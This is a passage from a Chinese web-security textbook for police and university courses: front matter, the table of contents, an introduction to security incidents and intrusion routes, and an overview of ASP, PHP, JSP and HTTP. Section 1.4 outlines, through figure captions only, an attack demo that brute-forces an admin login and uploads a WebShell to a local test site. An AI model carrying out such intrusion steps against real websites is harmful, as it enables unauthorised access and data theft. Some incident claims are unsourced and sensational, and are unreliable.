# Web 安全基础教程

○佟晖 陈晓光 张作峰◎主编

JIAOCHENG 

WEB ANQUAN JICHU 

## Web

## 安全基础教程

WEB ANQUAN JICHU
JIAOCHENG 

## Web

## 安全基础教程

![image](MinerU_markdown_Web安全基础教程_assets/image_0001_d685925be2c4.jpg)


JIAOCHENG 

WEB ANQUAN JICHU 

## 图书在版编目（CIP）数据

Web 安全基础教程 / 佟晖等主编. —北京：北京师范大学出版社，2017.8

新世纪高等学校规划教材·信息安全系列

ISBN 978-7-303-22377-0 

I. ①W… II. ①佟… III. ①互联网络－安全技术－高等学校－教材 IV. ①TP393.408

中国版本图书馆 CIP 数据核字（2017）第 114358 号

营销中心电话 010-62978190 62979006

北师大出版社科技与经管分社网 www.jswsbook.com

电子信箱 jswsbook@163.com

出版发行：北京师范大学出版社 www.bnup.com

北京市海淀区新街口外大街19号

邮政编码：100875

印刷：北京玺诚印务有限公司

经销：全国新华书店

开 本：787 mm×1092 mm 1/16

印 张：12.25

字 数：277 千字

版 次：2017年8月第1版

印 次：2017年8月第1次印刷

定 价：29.80 元

策划编辑：赵洛育

责任编辑：赵洛育

美术编辑：刘超

装帧设计：刘超

责任校对：赵非非

责任印制：赵非非

## 版权所有 侵权必究

反盗版、反侵权举报电话：010-62978190

北京读者服务部电话：010-62979006-8021

外埠邮购电话：010-62978190

本书如有印装质量问题，请与印制管理部联系调换。

印制管理部电话：010-62979006-8006

## 主編簡介

佟晖，女，硕士研究生，教授，硕士研究生导师。北京警察学院公安科技系副主任，北京警察学院学术委员会委员，北京市高等教育学会计算机教育研究会常务理事。先后承担国家以及省部级项目10余项，主编教材4部，发表论文30余篇。公安部高等教育教学名师、全国优秀人民警察。

陈晓光，男，硕士研究生。恒安嘉新（北京）科技股份公司执行总裁，资深安全专家，中国网络空间安全协会理事委员，腾讯守护者计划特聘专家。毕业于北京邮电大学信息安全国家重点实验室，长期从事网络与信息安全的技术研究、方案设计和产品推广工作。参与多项重大国家和行业标准、全国性安全系统工程和国家关键课题研究，拥有 CISSP、CISA、ISO 27001 LA 等安全资质。

张作峰，男，本科。具有十余年网络安全行业从业经验，主要研究方向为 Web 安全。具备行业内多项安全资质，目前为恒安嘉新（北京）科技股份公司安全攻防团队负责人，曾圆满的完成了北京奥运会、广州亚运会、上海世博会、十八大、二十国集团峰会、世界互联网大会等国家重要活动的网络安全技术保障任务。

# 本书编委会成员

主编：佟晖 陈晓光 张作峰

副主编：胡兵 刘晓蔚 王文娟 李雅楠

撰稿人：（按姓氏笔画排序）

卜宁琳 于存楠 王兆龙 刘书 齐柏 纪鲁鹏 杜爽 李刚 李欢

李旭敏 李艳梅 李雅楠 杨志学 杨晨 肖祥勇 佟晖 张小玲 张作峰

张冠廷 张瑜龙 武鸿浩 黄泽超 梁健芳 魏喆

“没有网络安全，就没有国家安全”。当前，网络安全已被提升到国家战略的高度，成为影响国家安全、社会稳定至关重要的因素之一。

面对严峻挑战，为实施国家安全战略，国务院学位委员会、教育部决定在“工学”门类下增设“网络空间安全”一级学科，在“公安技术”一级学科下开设“网络安全与执法”专业，网络安全专门人才的培养逐渐步入正轨。

本书分为 5 篇，共 17 章，内容包括 Web 安全基础介绍、Web 安全测试方法、Web 常见漏洞介绍、Web 安全实战演练、日常安全意识。附录部分为相关课程设计了大纲框架图。同时提供了课时分配供参考。本书编写特点：一是注重理论与实战的结合。以安全理论知识为本，结合实战以及教学视频，将实际问题分解映射到相关理论，既便于课堂讲解，也便于学生自学。二是实战操作步骤详尽，图文并茂。三是取材上既考虑了传统的、经典的技术，又引入大量新的、有代表性的技术。

本书可以作为普通高等院校网络空间安全学科和公安高等院校网络安全与执法专业学生的教学用书和参考书，也适合广大网络安全爱好者自学。本书帮助读者掌握 Web 安全知识和网络安全技术，树立良好的网络安全防范意识，为从事相关工作奠定坚实基础。

在此出版之际，对关心和支持我们编写与出版工作的所有朋友表示衷心的感谢。感谢恒安嘉新（北京）科技股份公司（下文简称为“恒安嘉新”）金红总经理对编写工作的支持和指导。感谢北京师范大学出版社赵洛育主任的大力帮助。感谢恒安嘉新的专家和北京警察学院的老师将日常教学与工作实践相结合，反复斟酌，数次修改，确保了知识点的条理清楚、语言的生动形象和技术的科学实用。

由于水平有限，书中难免有不妥之处，加之网络攻防技术纵深宽广，发展迅速，在内容取舍和编排上，难免考虑不周全，诚请读者批评指正。

## 第 1 篇 Web 安全基础介绍

## 第 1 章 Web 安全简介 …… 2

1.1 最新安全事件....2

1.2 黑客、白客、灰客 3

1.3 网站入侵的途径....3

1.4 实战演练（网站入侵） 5

1.5 如何学好 Web 安全.....8

## 第 2 章 Web 安全基础知识介绍 …… 10

2.1 Web 架构介绍.....10

2.1.1 ASP....10 

2.1.2 PHP....11 

2.1.3 JSP 13 

2.2 HTTP 协议介绍 ..... 14

2.2.1 GET 请求 ..... 15

2.2.2 POST 请求 ..... 16

2.2.3 其他 HTTP 请求 ..... 16

2.3 实战操作....17

## 第 2 篇 Web 安全测试方法

## 第 3 章 信息探测.....20

3.1 Google Hacking....20 

3.1.1 搜集子域名 ..... 20

3.1.2 搜集 Web 信息.....21

3.2 Nmap Scanning 24 

3.2.1 安装 Nmap 24

3.2.2 探测主机信息 28

3.3 实战操作....31

第 4 章 Web 漏洞检测工具简介 …… 32

4.1 AWVS 介绍....32

4.1.1 WVS 向导扫描 ..... 32

4.1.2 Web 扫描服务.....35

4.2 AppScan 介绍 ..... 37

4.2.1 使用 AppScan 扫描 ..... 37

4.2.2 处理结果....40

## 第 3 篇 Web 常见漏洞介绍

第 5 章 SQL 注入漏洞 ..... 44

5.1 SQL 注入原理 ..... 44

5.2 注入漏洞分类....45

5.2.1 数字型注入 46

5.2.2 字符型注入 47

5.3 注入工具 48

5.3.1 Sqlmap....48 

5.3.2 Pangolin....51 

5.4 实战操作....53

第 6 章 上传漏洞....54

6.1 直接上传漏洞 54

6.2 中间件解析漏洞 ..... 56

6.2.1 IIS 解析漏洞 ..... 56

6.2.2 Apache 解析漏洞 ..... 58

6.2.3 Nginx 解析漏洞 ..... 59

6.3 绕过上传漏洞 ..... 59

6.3.1 客户端检测....59

6.3.2 服务器端检测....60

6.4 实战操作....63

第 7 章 XSS 跨站脚本漏洞 ……64

7.1 XSS 原理解析....64

7.2 XSS 类型....65

7.2.1 反射型 XSS....65

7.2.2 存储型 XSS....66

7.3 实战操作....67

## 第 8 章 命令执行漏洞 ..... 70

8.1 命令执行漏洞示例 ..... 70

8.2 命令执行模型....75

8.3 框架执行漏洞 ..... 79

8.3.1 Struts 2 代码执行漏洞....80

8.3.2 Java 反序列化代码执行漏洞 ..... 84

8.4 实战操作....86

## 第 9 章 文件包含漏洞 ..... 91

9.1 包含漏洞原理解析 ..... 91

9.1.1 本地文件包含....92

9.1.2 远程文件包含 93

9.2 实战操作....97

## 第 10 章 其他漏洞（简单介绍）....100

10.1 CSRF 介绍 ..... 100

10.2 逻辑错误漏洞介绍 ..... 102

10.2.1 挖掘逻辑漏洞....102

10.2.2 绕过授权验证....102

10.2.3 密码找回逻辑漏洞 103

10.2.4 支付逻辑漏洞....105

10.2.5 指定账户恶意攻击 106

10.3 URL 跳转与钓鱼 107

10.4 实战操作....109

## 第 11 章 暴力破解....110

11.1 暴力破解概述 ..... 110

11.2 Burp Suite.... 110 

11.2.1 Proxy 110 

11.2.2 Intruder 113 

11.3 暴力破解案例 ..... 115

11.4 实战操作....120

## 第 12 章 旁注攻击....124

12.1 IP 逆向查询 ..... 124

12.2 目录越权....125

12.3 实战操作....126

## 第 13 章 提权....127

13.1 获取系统权限....129

13.2 实战操作....138

## 第 4 篇 Web 安全实战演练

第 14 章 攻击全过程....140

14.1 信息搜集....140

14.2 漏洞扫描....143

14.3 手工测试....144

14.4 漏洞利用及 GetShell 149

14.5 提权....149

## 第 5 篇 日常安全意识

第 15 章 社会工程学 …… 154

15.1 信息搜集....154

15.2 实战操作....158

第 16 章 电信诈骗手段还原 …… 161

16.1 钓鱼技术....161

16.2 改号软件....165

16.3 猫池技术....166

第 17 章 IP 溯源技术及标准化 ..... 172

17.1 网络攻击模型 ..... 172

17.2 追踪溯源技术....173

17.3 实战操作....177

附录 181

课时分配 182

参考文献 …… 183

## 第1篇

Web 安全基础介绍

# Web 安全简介

## 1.1 最新安全事件①

近年来，全球大规模网站被黑、数据泄露事件频繁发生，掌握大量个人信息的政府机构、大型零售企业、金融机构，以及移动应用服务提供商成为信息窃取的重要目标。在网络智能飞速发展的今天，黑客利用工控设备、交通工具系统存在的漏洞入侵系统，进而执行一些恶意操作的事件日益增多。本节中介绍发生在我们身边的网络安全事件。

据外媒报道，黑客利用成本不足20美元的工具可黑掉汽车系统。可实现的功能包括关闭头灯、关闭警报系统、关闭车窗、关闭ABS系统或紧急刹车系统。根据最新的研究，利用大约1亿辆大众汽车共同存在的漏洞，可以让小偷远程通过无线信号打开大众汽车的车门。这种新的攻击手法几乎适用于所有1995年后生产的大众汽车。
波兰航空公司LOT的地面操作系统遭遇黑客袭击，致使系统瘫痪长达5小时，至少10个班次的航班被取消，1400多名乘客滞留机场。据悉，这是民航公司全球首次遭遇操作系统被黑。若黑客攻击的是飞行系统，攻击者可通过劫持飞机上的娱乐系统或IFE，并重写飞机的推进管理计算机中的代码，能向飞机下达爬升的命令，并让飞机短暂改变航向。更为严重的事情是，还可以推论出如何在35000英尺的高空中关闭飞机发动机，而且在驾驶舱内不会有警示灯的提示。众所周知，一旦飞机偏离航向或关闭发动机，造成的后果难以想象。

浙江省温州电视广播中心系统遭黑客攻击，黑客通过技术方式将反动信息植入网络机顶盒，在四十几万用户收看电视时，弹出带有反动图文信息的画面。

- 台湾地区一用户报警称自己在家的一举一动被发布在网上直播，原来是黑客利用漏洞攻破了安装在家里的网络摄像机，进而监控用户的一举一动。

- 台湾第一银行旗下20多家分行的41台ATM机遭遇黑客攻击，ATM机有不明吐钞情况，被盗8327余万新台币。

2016 年 3 月，一类名为 “密锁” 的敲诈型恶性病毒在国内突然爆发，该类病毒通过电子邮件传播，一旦用户点击带毒附件，计算机中的各类文档、隐私文件都将被病毒 “上锁”，如不按黑客要求付款，将永远无法恢复正常。2016 年上半年手机安全报告数据显示，全国感染手机病毒用户超 2 亿人次，并呈上升趋势。感染用户中有 72% 的用户使用公共 WiFi，移动支付，这给用户的财产安全构成进一步威胁。

武汉一家汽车销售公司的会计，被“董事长”拉入一个克隆的微信群，被骗85万元。根据调查，用户平时使用微信时若点击了钓鱼网站，不法分子利用获取的信息可克隆微信群等，进而实施诈骗。

辽宁警方揭秘了朋友圈投票的真相。诈骗团伙利用投票活动，获取报名者的个人信息，进而将信息出售。利用获取到的详细信息，团伙可进一步实施诈骗行为。

高考结束，不少同学和家长都通过网站查询报考学校和专业。高校网站也成为黑客攻击的重要目标。黑客入侵高校网站后，在访问量较高的院系网站挂木马，用户点击后木马会感染系统，进而获取照片、账号等敏感信息。

- 2016 年 8 月，DOTA2 论坛被黑，近 200 万用户详细信息被窃取，其中包括用户名、邮件地址、用户识别码、密码、IP 地址。

## 1.2 黑客、白客、灰客

黑客，源自英文 hacker，曾指热心于计算机技术、水平高超的计算机专家，尤其是程序设计人员，现在逐渐区分为白帽子、灰帽子、黑帽子等。

白客（白帽子）是正面的黑客。白客检测到系统漏洞后，不会恶意利用漏洞、窃取系统数据，而是公布漏洞，提醒网站管理员及时修复，防止网站系统被其他人（如黑帽子）攻击。

灰客（灰帽子）与白帽子相似。灰客擅长攻击技术，精通攻击与防御，但不轻易造成破坏。通常灰客将黑客行为作为一种业余爱好来做，希望通过黑客行为来警告系统管理员网络或系统存在漏洞，以达到警示别人的目的。

与白帽子相对的就是黑帽子，即传统意义的黑客。在发现系统漏洞后，会利用攻击技术窃取网站信息，滥用资源，恶意攻击，蓄意破坏。黑帽子的主要目的是要入侵系统，找到有价值的数据，通常有黑色产业链，以此非法获取利益。

## 1.3 网站入侵的途径

网站被入侵，大部分原因是网站（系统）存在漏洞，包括主机（服务器）漏洞、中间件（apache、weblogic……）漏洞、应用服务（数据库、FTP 文件服务、Web 应用……）漏洞等。本书着重介绍攻击者利用 Web 漏洞攻击网站。漏洞产生原因是多方面的。首先，很多开发人员没有安全意识，开发的代码中出现漏洞。其次，系统上线之后的服务器环境可能会有变化，本来没有问题的代码可能就变得有问题。另外，管理员密码泄露、一些配置性错误等都会存在安全问题。当然，即便目标系统不可被直接入侵，攻击者也可以通过 C 段服务器（同网段服务器）间接对目标主机进行渗透，或利用社会工程学收集信息以达到入侵系统的目的。如图 1-1 所示为对漏洞的大致分类。

![image](MinerU_markdown_Web安全基础教程_assets/image_0002_7f669868507c.jpg)



图 1-1 漏洞分类


攻击者在渗透服务器时，直接对目标下手一般有三种手段，当了解攻击者的手段之后，防御也就变得简单了。图 1-2 显示了 Web 应用的风险点，攻击者入侵服务器可能就是从这些点下手的。黑客如何利用漏洞攻击网站，具体细节将在后面的章节介绍。

○ C 段渗透：攻击者通过渗透同一网段内的一台主机对目标主机进行 ARP 等手段的渗透。

- 社会工程学：社会工程学是高端攻击者必须掌握的一个技能，渗透服务器有时不仅仅只靠技术。详细内容请参照第 15 章 “社会工程学”。

Services: 很多传统的攻击方式是直接利用应用服务存在的漏洞，例如溢出，至今一些软件仍然存在溢出漏洞。像之前的 MySQL 就出现过缓冲区溢出漏洞。当然，对这类服务还有其他入侵方式，这些方式也经常用于内网的渗透中，在后面的章节中都会一一讲述。

![image](MinerU_markdown_Web安全基础教程_assets/image_0003_64806b4fd3e3.jpg)



图1-2Web应用存在的风险点


## 1.4 实战演练（网站入侵）

本节通过一个简单的例子来了解黑客是如何攻击网站的。

演示案例：

目标网站：127.0.0.1

被攻击的原因：

管理员登录账号存在弱口令漏洞，攻击者可利用暴力破解工具获取账号，登录系统，进而获取用户信息。

○ 用户信息管理页面上传头像对文件类型未做限制，攻击者可上传 WebShell，进而获取网站服务器控制权限。

攻击过程:

攻击过程如图 1-3～图 1-11 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0004_1c15695ba652.jpg)



图 1-3 使用暴力破解工具获取管理员登录账号


![image](MinerU_markdown_Web安全基础教程_assets/image_0005_9ca2a9d8d93e.jpg)



图 1-4 利用获取的管理员账号登录网站


<table><tr><td colspan="4">127.0.0.1/list?page=1</td></tr><tr><td colspan="4">学生信息列表</td></tr><tr><td>ID</td><td>姓名</td><td>性别</td><td></td></tr><tr><td>1</td><td>李明</td><td>男</td><td>1</td></tr><tr><td>2</td><td>赵志刚</td><td>男</td><td>1</td></tr><tr><td>3</td><td>王宝宝</td><td>女</td><td>1</td></tr><tr><td>4</td><td>张合</td><td>男</td><td>1</td></tr></table>


图 1-5 成功登录网站后台


![image](MinerU_markdown_Web安全基础教程_assets/image_0006_bd3265491242.jpg)



图 1-6 在学生信息管理上传头像处上传 WebShell


![image](MinerU_markdown_Web安全基础教程_assets/image_0007_c69c574ab174.jpg)



图 1-7 WebShell 上传成功


![image](MinerU_markdown_Web安全基础教程_assets/image_0008_fc52fe9164ab.jpg)



图 1-8 获取后门链接地址


![image](MinerU_markdown_Web安全基础教程_assets/image_0009_508fae200a95.jpg)



图 1-9 利用连接工具访问网站服务器


![image](MinerU_markdown_Web安全基础教程_assets/image_0010_a3a67f7c6c88.jpg)



图 1-10 在网站上写入文件


![image](MinerU_markdown_Web安全基础教程_assets/image_0011_8cd1a6be42cb.jpg)



图 1-11 对网站进行修改


入侵结果:

攻击者获取网站服务器控制权限，可访问网站服务器，获取敏感信息，对网站及数据库等可执行增、删、改等操作。

演示参照第 1 章视频 1-1。

## 1.5 如何学好 Web 安全

## 1. 什么是 Web

Web 是互联网上的一种服务，使用超文本技术将遍布全球的各种信息资源链接起来，以便于用户浏览。包含多样的信息资源格式：文本、多媒体、数据库、应用程序。资源可彼此通过链接连起来，在逻辑上形成一个遍布全球的巨大的“信息网络”。

互联网和 Web 是两个完全不同的概念。互联网是 Web 的基础平台，Web 是互联网平台上的一种应用服务。

## 2. 安全的三要素

通过无数实践，人们最后将安全的属性总结为安全三要素，简称 CIA。安全三要素是安全的基本组成元素，分别是机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。

## (1) 机密性

要求保护数据内容不能泄露，加密是实现机密性要求的常见手段。

## (2) 完整性

要求保护数据内容是完整、没有被篡改的，常见的保证完整性的技术手段是数字签名。

## (3) 可用性

可用性是在某个考察时间，系统能够正常运行的概率或时间占有率期望值。要求保护资源是“随需而得”。

在安全领域中，最基本的要素就是这三个，后来还有人想扩充这些要素，增加了诸如可审计性、不可抵赖性等，但最重要的还是以上三个要素。

## 3. 如何学好 Web 安全

如何学好 Web 安全？这个问题需要从两方面阐述，一方面是技术人员自身需具备一定的技术能力。渗透测试人员与攻击者的性质不一样，攻击者只需要找到程序的一个突破口，拿到权限即可，而渗透测试人员或“白帽子”则必须要找到系统所有的漏洞，才能保证系统的安全。然而真正想做到对这些漏洞知其所以然，必须学习编程技术。下面列举一些不错的语言及其应用领域。

○ C/C++：永远不会衰败的语言，适合偏底层，如 Windows 操作系统 80% 以上都是由 C/C++ 完成的，C/C++ 也经常用于写应用层 C/S 架构的软件。若想研究缓冲区溢出，或者针对底层协议写一些软件，那么非 C/C++ 莫属。

○ Java: 真正跨平台的语言，“一次编译，到处运行”即是 Java 的口号。Java 适合应用层的开发，无论是 C/S 架构还是 B/S 架构，Java 都能实现，但在国内使用 Java （JSP）B/S 架构居多，很多大型企业都采用了 Java 作为 Web 开发的首选。

○ C#: 与 Java 有 70% 的雷同，同样适用于开发应用层程序，无论是 C/S 架构还是 B/S 架构，C# 都可以实现，C# 拥有强大的 .NET Framework 支持，但是不能跨平台。

- PHP：跨平台的语言，脚本语言，无须编译，但 PHP 的能力仅限于 Web，速度较慢，也不支持多线程。作为一名 Web 安全研究者，几乎所有的人都会学习它。

- Python: 号称 “大蟒蛇”，跨平台，脚本语言，无须编译，适用于一些 Shell 操作，最近 Python 也在 Web 领域取得了一些成就，开发较快，运行速度较慢（相对于 C/C++ 来说），不过很多安全研究者都比较喜欢 Python。Sqlmap、W3af 都是利用 Python 语言编写的安全工具，在渗透测试平台 Backtrack 下随处可见 Python 的身影。

- HTML：属于前端语言之一，是渗透测试人员必须了解的语言。

JavaScript: 属于前端语言之一，掌握 JavaScript 后，可以帮助渗透测试人员更好地理解 XSS 跨站脚本攻击。

数据库：数据库分为很多种，有 Oracle、MySQL、SQL Server、DB2 等，操作数据库的语言即 SQL 语句，掌握一门 SQL 语言是必需的，因为几乎没有网站不使用数据库。

读者可根据实际需求选择一门适合自己的语言，虽然说渗透测试时，没有代码基础也能出色地完成任务，但相对来说，掌握语言的基础是非常有帮助的，因为在渗透过程中有时无法避免有针对性地编写一些代码，代码功底是“菜鸟”和“大牛”一个明显的分水岭。

# Web 安全基础知识介绍

## 2.1 Web 架构介绍

## 2.1.1 ASP

## 1. ASP 简介

ASP 是动态服务器页面（Active Server Pages）的英文缩写，后来也称为经典 ASP，是微软公司开发的代替 CGI $^{①}$ 脚本程序的一种应用，也是微软公司的第一个服务器侧的脚本引擎，能够动态产生 Web 页面，其中文名等信息如表 2-1 所示。ASP 可以与 Web 数据库以及其他程序进行交互，是一种简单、方便的编程工具。ASP 的网页文件的格式是.asp，曾用于各种动态网站中。2002 年 1 月微软发布 ASP.NET，用于取代 ASP。


表 2-1 ASP 相关信息


<table><tr><td>中文名</td><td>动态服务器页面</td></tr><tr><td>外文名</td><td>Active Server Pages</td></tr><tr><td>英文缩写</td><td>ASP</td></tr><tr><td>开发公司</td><td>微软公司</td></tr><tr><td>类型</td><td>Web 应用框架</td></tr></table>

## 2. ASP 架构

ASP 使用服务器侧的脚本生成页面内容并发给访问者的页面浏览器。ASP 解释器读取并执行所有在<%和%>标签之间的脚本代码，并生成内容。这些脚本使用 VBScript、JScript 和 PerlScript $^{②}$ 编写。@Language 指令，<scriptlanguage='manu' runat='server'/>句法或服务器配置都可用于选择语言。

.asp 扩展名的 Web 页面使用 ASP 技术，一些 Web 站点为了安全，会通过使用更常见的 .htm 或 .html 扩展名来伪装它们对脚本语言的选择。.aspx 扩展名的页面使用 ASP.NET。

但是 ASP.NET 页面也可以包含一些 ASP 脚本。当介绍 ASP.NET 时，往往使用经典 ASP 这一术语来表示原始的 ASP 技术。

ASP 只在 Windows 上运行，一些产品在非微软的 Web 服务器上仿真了经典 ASP 的部分功能，例如，Apache::ASP 移植经典 ASP 到 Apache 的 Web 服务器上，但只能使用 PerlScript 脚本语言。

## 3. ASP 特点

## （1）任何开发工具皆可发展 ASP

只要使用一般的文书编辑程序，如 Windows 记事本，就可以编辑。当然，其他网页开发工具，如 FrontPageExpress、FrontPage 等也可以；建议用记事本来写，既省钱又方便，若是使用所见即所得的网页编辑来写 ASP，可能会发生一些意想不到的情况。

## (2) 通吃各家浏览器

由于 ASP 程序是在网络服务器端执行，执行结果所产生的 HTML 文件适用于不同的浏览器。

## (3) 语言相容性高

ASP 与所有的 ActiveXScript 语言都相容，除了可结合 HTML、VBScript、JavaScript、ActiveX 服务器组件来设计外，还可经由 plug-In（外挂组件模组）的方式，使用其他厂商（ThirdParty）所提供的语言。

## (4) 隐秘安全性高

在浏览器中直接查看网页源码，只能看到 HTML 文件，原始的 ASP 程序代码是看不到的。这是因为 ASP 程序先于网站服务（WebServer）端执行后，将结果转换成标准 HTML 文件，再传送到客户端（Client）的浏览器上。因此，ASP 程序并不会轻易地被看见进而被盗用。

## (5) 易于操控数据库

ASP 可以轻易地通过 ODBC（Open Database Connectivity）驱动程序连接各种不同的数据库，例如，Access、FoxPro、dBASE、Oracle 等，另外，ASP 亦可将文本文件、Excel 文件当成数据库用。

## (6) 面向对象学习容易

ASP 具备面向对象（Object-Oriented）功能，学习容易，提供了 5 种方便、能力强大的内建对象：Request、Response、Server、Application 以及 Session，同时，使用 ASP 内建的 Application 对象或 Session 对象所撰写出来的 ASP 程序，可以在多个网页之间暂时保存必要的信息。

## 2.1.2 PHP

## 1. PHP 简介

PHP（Hypertext Preprocessor，超文本预处理器）是一种通用开源脚本语言，如表 2-2 所示。


表 2-2 PHP 相关信息


<table><tr><td>中文名</td><td>超文本预处理器</td><td>维护</td><td>The PHP Group</td></tr><tr><td>外文名</td><td>Hypertext Preprocessor</td><td>最新版本</td><td>PHP 5.6.0(2014年8月28日)</td></tr><tr><td>编程范型</td><td>面向对象、命令式编程</td><td>操作系统</td><td>Windows/Linux/Mac 跨平台</td></tr><tr><td>设计者</td><td>Rasmus Lerdorf</td><td>外语缩写</td><td>PHP</td></tr></table>

## 2. PHP 特点

（1）PHP 独特的语法混合了 C、Java、Perl 以及 PHP 自创新的语法。

(2) PHP 可以比 CGI 或者 Perl 更快速地执行动态网页，在动态页面方面，与其他的编程语言相比，PHP 是将程序嵌入到 HTML 文档中去执行，执行效率比完全生成 HTML 标记的 CGI 要高许多；PHP 具有非常强大的功能，所有 CGI 的功能 PHP 都能实现。

（3）PHP 支持几乎所有流行的数据库以及操作系统。

(4) PHP 可以用 C、C++ 进行程序的扩展。

## 3. PHP 优势

## (1) 开放源代码

所有的 PHP 源代码事实上都可以得到。

## (2) 免费性

和其他技术相比，PHP 本身免费且是开源代码。

## (3) 快捷性

程序开发快，运行快，技术易掌握。因为 PHP 可以被嵌入 HTML 语言，相对于其他语言，PHP 编辑简单，实用性强，更适合初学者。

## (4) 跨平台性强

由于 PHP 是运行在服务器端的脚本，可以运行在 UNIX、Linux、Windows、MacOS、Android 等平台。

## (5) 效率高

PHP 消耗相当少的系统资源。

## (6) 图像处理

用 PHP 动态创建图像，PHP 图像处理默认使用 GD2，也可以配置为使用 ImageMagick 进行图像处理。

## (7) 面向对象

在 PHP4、PHP5 中，面向对象方面都有了很大的改进，PHP 完全可以用来开发大型商业程序。

## (8) 专业专注

PHP 支持脚本语言为主，同为类 C 语言。

## 2.1.3 JSP

## 1. JSP 简介

JSP（Java Server Pages，java 服务器页面）实际上是一个简化的 Servlet $^{①}$ 设计，是由 Sun Microsystems 公司倡导、许多公司参与建立的一种动态网页技术标准，相关信息如表 2-3 所示。JSP 技术类似于 ASP 技术，是在传统的网页 HTML（标准通用标记语言的子集）文件（*.htm,*.html）中插入 Java 程序段（Scriptlet）和 JSP 标记（tag），从而形成 JSP 文件，后缀名为（*.jsp）。用 JSP 开发的 Web 应用是跨平台的，既能在 Linux 下运行，也能在其他操作系统上运行。


表 2-3 JSP 相关信息


<table><tr><td>中文名</td><td>Java 服务器页面</td></tr><tr><td>外文名</td><td>Java Server Pages</td></tr><tr><td>外语缩写</td><td>JSP</td></tr><tr><td>本质</td><td>动态网页技术标准</td></tr></table>

JSP 实现了 HTML 语法中的 Java 扩展（以<%,%>形式）。JSP 与 Servlet 一样，是在服务器端执行的，通常返回给客户端的就是一个 HTML 文本，因此客户端只要有浏览器就能浏览。

JSP 技术使用 Java 编程语言编写类 XML 的 tags 和 scriptlets 来封装产生动态网页的处理逻辑。网页还能通过 tags 和 scriptlets 访问存在于服务端的资源的应用逻辑。JSP 将网页逻辑与网页设计的显示分离，支持可重用的基于组件的设计，使基于 Web 的应用程序的开发变得迅速和容易。JSP（Java Server Pages）是一种动态页面技术，其主要目的是将表示逻辑从 Servlet 中分离出来。

Java Servlet 是 JSP 的技术基础，而且大型的 Web 应用程序的开发需要 Java Servlet 和 JSP 配合才能完成。JSP 具备了 Java 技术的简单易用、完全的面向对象，具有平台无关性且安全可靠，主要面向因特网的所有特点。

## 2. JSP 语言标准

一个JSP页面可以被分为以下几部分：

○ 静态数据，如 HTML。

○ JSP 指令，如 include 指令。

○ JSP 脚本元素和变量。

○ JSP 动作。

○ 用户自定义标签。

## 3. JSP 优点

（1）一次编写，到处运行。除了系统之外，代码不用做任何更改。

（2）系统的多平台支持。基本上可以在所有平台上的任意环境中开发，在任意环境中进行系统部署，在任意环境中扩展。相比 ASP 的局限性，JSP 的优势是显而易见的。

（3）强大的可伸缩性。从只有一个小的 JAR 文件就可以运行 Servlet/JSP，到由多台服务器进行集群和负载均衡，再到多台 Application 进行事务处理，消息处理，从一台服务器到无数台服务器，Java 显示了巨大的生命力。

（4）多样化和功能强大的开发工具支持。这一点与 ASP 很像，Java 已经有了许多非常优秀的开发工具，而且很多工具可以免费得到，并且其中许多已经可以顺利地运行于多种平台之下。

（5）支持服务器端组件。Web 应用需要强大的服务器端组件来支持，开发人员需要利用其他工具设计实现复杂功能的组件供 Web 页面调用，以增强系统性能。JSP 可以使用成熟的 JavaBeans 组件来实现复杂商务功能。

## 4. JSP 缺点

（1）与 ASP 一样，Java 的一些优势正是它致命的问题所在。正是为了实现跨平台的功能，为了拥有极度的伸缩能力，所以极大地增加了产品的复杂性。

(2) Java 的运行速度是用 class 常驻内存来保证的，所以它在一些情况下所使用的内存比起用户数量来说确实是 “最低性能价格比” 了。

## 2.2 HTTP 协议介绍

随着 Web 2.0 时代的到来，互联网从传统的 C/S 架构（客户机和服务器结构）转变为更加方便、快捷的 B/S 架构。B/S 即浏览器/服务器结构，即客户机只需要一个浏览器即可上网冲浪。当客户端与 Web 服务器进行交互时，就存在 Web 请求，这种请求都基于统一的应用层协议（HTTP 协议）交互数据。

HTTP 协议（Hyper Text Transfer Protocol）即超文本传输协议，详细规定了浏览器和万维网服务器之间互相通信的规则，它是万维网交换信息的基础，允许将 HTML（超文本标记语言）文档从 Web 服务器传送到 Web 浏览器。

HTTP 协议目前的最新版本是 1.1，HTTP 是一种无状态的协议。无状态是指 Web 浏览器与 Web 服务器之间不需要建立持久的连接，这意味着一个客户端向服务器端发出请求，然后 Web 服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP 请求只能由客户端发起，而服务器不能主动向客户端发送数据。

HTTP 遵循请求（Request）/应答（Response）模型，Web 浏览器向 Web 服务器发送请求时，Web 服务器处理请求并返回适当的应答，如图 2-1 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0012_bb6f2653dbde.jpg)



图 2-1 请求应答模型


HTTP 协议的主要特点如下:

（1）支持客户/服务器模式。

（2）简单快速，客户向服务器请求服务时，只需传送请求方法和路径。常用的请求方法有 GET、POST。每种方法规定了客户与服务器联系的类型不同。由于 HTTP 协议简单，使得 HTTP 服务器的程序规模小，因而通信速度很快。

（3）灵活：HTTP 允许传输任意类型的数据对象。正在传输的类型由 Content-Type 加以标记。

（4）无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。

（5）无状态：HTTP 协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着若后续处理需要前面的信息，则必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时，应答就较快。

下面将对常用 GET、POST 及其他请求方法进行详细介绍。

## 2.2.1 GET 请求

GET 方法用于获取请求页面的指定信息（以实体的格式）。若请求资源为动态脚本（非 HTML），那么返回文本 Web 容器解析后的是 HTML 源代码，而不是源文件。例如，请求 index.jsp，返回的不是 index.jsp 的源文件，而是经过解析的 HTML 代码。

如下 HTTP 请求:

GET /index.php?id=1 HTTP/1.1 

HOST: www.xxser.com 

使用 GET 请求 index.php，并且 id 参数为 1，在服务器端脚本语言中可以选择性地接收这些参数，例如 id=1&name=admin，一般都是由开发者内定好的参数项目才会接收，例如，开发者只接收 id 参数项目，若加了其他参数项，如：

Index.php?id=l&username=admin//多个参数项以"&"分隔

服务器端脚本不会理会加入的内容，依然只会接收 id 参数，并且去查询数据，最终向服务器端发送解析过的 HTML 数据。

## 2.2.2 POST 请求

